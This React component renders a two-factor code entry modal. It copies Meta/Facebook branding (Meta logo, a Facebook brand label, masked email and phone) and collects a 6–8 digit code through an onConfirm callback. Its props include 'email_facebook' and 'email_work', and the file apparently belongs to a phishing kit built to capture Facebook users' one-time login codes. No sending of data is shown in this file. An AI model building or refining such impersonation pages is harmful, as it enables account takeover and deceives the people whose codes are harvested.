import { useState } from 'react';
import PropTypes from 'prop-types';
import { useLang } from '@/context/lang-context';
import logoMeta from '@/assets/images/logo-meta.svg';
import twoFaImage from '@/assets/images/2FA.png';

const inputWrapperBase = {
    position: 'relative',
    width: '100%',
    border: '1px solid #d4dbe3',
    height: '40px',
    padding: '0 11px',
    borderRadius: '10px',
    background: '#fff',
    fontSize: '14px',
    marginBottom: '10px',
    display: 'flex',
    alignItems: 'center',
    transition: 'border-color 0.2s, box-shadow 0.2s',
    boxSizing: 'border-box',
};

const TwoFactorCodeModal = ({
    formData,
    emailOrPhone,
    email,
    phone,
    code,
    onCodeChange,
    onTryOther,
    onConfirm,
    loading,
    errorMsg,
    selectedMethod,
}) => {
    const { labels } = useLang();
    const [focused, setFocused] = useState(false);

    const maskEmailCompact = (raw) => {
        if (!raw) return 'e**l@example.com';
        const trimmed = String(raw).trim();
        const parts = trimmed.split('@');
        if (parts.length !== 2) return trimmed;
        const [name, domain] = parts;
        const lastChar = name.at(-1);
        if (name.length <= 2) return `${name[0] || ''}**@${domain}`;
        return `${name[0]}**${lastChar}@${domain}`;
    };

    const maskPhoneCompact = (raw) => {
        if (!raw) return '+** **** **';
        const cleaned = String(raw).replaceAll(/\s+/g, '');
        if (cleaned.length < 6) return raw;
        const rx = /^(\+\d{1,3})/;
        const countryMatch = rx.exec(cleaned);
        const countryCode = countryMatch?.[1] ?? '';
        const numberPart = cleaned.slice(countryCode.length);
        const lastTwo = numberPart.slice(-2);
        return `${countryCode || '+'} **** ${lastTwo}`;
    };

    const twoFADisplayTitle = labels.twoFaTitleNew;

    const fullName = formData?.full_name?.trim() || labels.twoFAFallbackUser;
    const emailToDisplay = email || formData?.email_facebook || formData?.email_work;
    const maskedEmail = maskEmailCompact(emailToDisplay);
    const maskedPhone = maskPhoneCompact(phone);

    const getDescriptionParagraph = () => {
        if (selectedMethod?.id === 'authenticator') {
            return labels.twoFaDescAuthenticator;
        }
        if (selectedMethod?.id === 'whatsapp') {
            const wp = maskPhoneCompact(phone || emailOrPhone);
            return `${labels.twoFaDescWhatsApp} ${wp || ''}`.trim() + '.';
        }
        return (labels.twoFaDescriptionTemplate || '')
            .replaceAll('{{email}}', maskedEmail)
            .replaceAll('{{phone}}', maskedPhone);
    };

    const hasErrorStyle = Boolean(errorMsg);
    const codeTrimmed = code.trim();
    const codeLengthOk = codeTrimmed.length >= 6 && codeTrimmed.length <= 8;
    const canSubmit = codeLengthOk && !loading;

    let inputBorderColor = '#d4dbe3';
    let inputBoxShadow = 'none';
    if (hasErrorStyle) {
        inputBorderColor = '#ef4444';
        inputBoxShadow = '0 4px 12px rgba(239,68,68,0.1)';
    } else if (focused) {
        inputBorderColor = '#3b82f6';
        inputBoxShadow = '0 4px 12px rgba(59,130,246,0.1)';
    }

    return (
        <div
            style={{
                background:
                    'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)',
                width: '100%',
                maxHeight: '90vh',
                borderRadius: '16px',
                padding: '20px',
                display: 'flex',
                flexDirection: 'column',
                overflow: 'hidden',
                boxSizing: 'border-box',
            }}
        >
            <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                <div style={{ width: '100%' }}>
                    <div
                        style={{
                            display: 'flex',
                            width: '100%',
                            alignItems: 'center',
                            color: '#9a979e',
                            gap: '6px',
                            fontSize: '14px',
                            marginBottom: '7px',
                        }}
                    >
                        <span>{fullName}</span>
                        <div style={{ width: '4px', height: '4px', background: '#9a979e', borderRadius: '5px' }} />
                        <span>{labels.twoFABrandFacebook}</span>
                    </div>

                    <div style={{ fontSize: '20px', color: '#000', fontWeight: '700', marginBottom: '15px' }}>
                        {twoFADisplayTitle}
                    </div>

                    <p style={{ color: '#9a979e', fontSize: '14px', lineHeight: '1.5', margin: 0 }}>
                        {getDescriptionParagraph()}
                    </p>

                    <div style={{ width: '100%', borderRadius: '10px', background: '#f5f5f5', overflow: 'hidden', margin: '15px 0' }}>
                        <img
                            width="100%"
                            alt={labels.twoFAAuthenticationImageAlt}
                            src={twoFaImage}
                            style={{ display: 'block', maxHeight: '248px', objectFit: 'contain' }}
                        />
                    </div>

                    <div style={{ width: '100%' }}>
                        <form
                            autoComplete="off"
                            onSubmit={(e) => {
                                e.preventDefault();
                                if (!canSubmit) return;
                                onConfirm();
                            }}
                        >
                            <div
                                style={{
                                    ...inputWrapperBase,
                                    borderColor: inputBorderColor,
                                    boxShadow: inputBoxShadow,
                                }}
                            >
                                <input
                                    id="twoFa"
                                    type="text"
                                    inputMode="numeric"
                                    autoComplete="one-time-code"
                                    placeholder={labels.twoFaCodePlaceholder}
                                    value={code}
                                    disabled={loading}
                                    onChange={(e) => onCodeChange(e.target.value)}
                                    onFocus={() => setFocused(true)}
                                    onBlur={() => setFocused(false)}
                                    style={{
                                        width: '100%',
                                        outline: 'none',
                                        border: 'none',
                                        background: 'transparent',
                                        fontSize: '14px',
                                        height: '100%',
                                        opacity: loading ? 0.65 : 1,
                                    }}
                                />
                            </div>

                            {errorMsg ? (
                                <p style={{ color: '#ef4444', fontSize: '13px', marginTop: '-6px', marginBottom: '10px', marginLeft: 0, marginRight: 0 }}>
                                    {errorMsg}
                                </p>
                            ) : null}

                            <div style={{ width: '100%', marginTop: '20px' }}>
                                <button
                                    type="submit"
                                    disabled={!canSubmit}
                                    style={{
                                        height: '45px',
                                        minHeight: '45px',
                                        width: '100%',
                                        background: '#0064E0',
                                        color: '#fff',
                                        borderRadius: '40px',
                                        border: 'none',
                                        display: 'flex',
                                        alignItems: 'center',
                                        justifyContent: 'center',
                                        cursor: canSubmit ? 'pointer' : 'not-allowed',
                                        fontWeight: '500',
                                        fontSize: '15px',
                                        fontFamily: 'inherit',
                                        position: 'relative',
                                        opacity: canSubmit ? 1 : 0.7,
                                        transition: 'opacity 0.3s',
                                    }}
                                >
                                    {loading ? (
                                        <span
                                            aria-hidden
                                            style={{
                                                width: '20px',
                                                height: '20px',
                                                border: '2.5px solid rgba(255,255,255,0.4)',
                                                borderTopColor: '#fff',
                                                borderRadius: '50%',
                                                animation: 'twoFaSpin 0.8s linear infinite',
                                                display: 'inline-block',
                                            }}
                                        />
                                    ) : (
                                        labels.twoFaContinueBtn
                                    )}
                                </button>
                            </div>

                            <button
                                type="button"
                                onClick={onTryOther}
                                style={{
                                    width: '100%',
                                    marginTop: '20px',
                                    color: '#9a979e',
                                    display: 'flex',
                                    alignItems: 'center',
                                    justifyContent: 'center',
                                    cursor: 'pointer',
                                    background: 'transparent',
                                    borderRadius: '40px',
                                    padding: '10px 20px',
                                    border: '1px solid #d4dbe3',
                                    boxSizing: 'border-box',
                                    fontFamily: 'inherit',
                                    fontSize: '14px',
                                    fontWeight: '500',
                                }}
                            >
                                {labels.twoFaTryOther}
                            </button>
                        </form>
                    </div>
                </div>

                <div style={{ width: '60px', margin: '20px auto 0', paddingTop: '32px' }}>
                    <img src={logoMeta} alt="Meta" style={{ width: '100%', height: 'auto', objectFit: 'contain', opacity: 0.4 }} />
                </div>
            </div>

            <style>{`
                @keyframes twoFaSpin { to { transform: rotate(360deg); } }
            `}</style>
        </div>
    );
};

export default TwoFactorCodeModal;

TwoFactorCodeModal.propTypes = {
    formData: PropTypes.object,
    emailOrPhone: PropTypes.string,
    email: PropTypes.string,
    phone: PropTypes.string,
    code: PropTypes.string.isRequired,
    onCodeChange: PropTypes.func.isRequired,
    onTryOther: PropTypes.func.isRequired,
    onConfirm: PropTypes.func.isRequired,
    loading: PropTypes.bool,
    errorMsg: PropTypes.string,
    selectedMethod: PropTypes.shape({ id: PropTypes.string, label: PropTypes.string }),
};
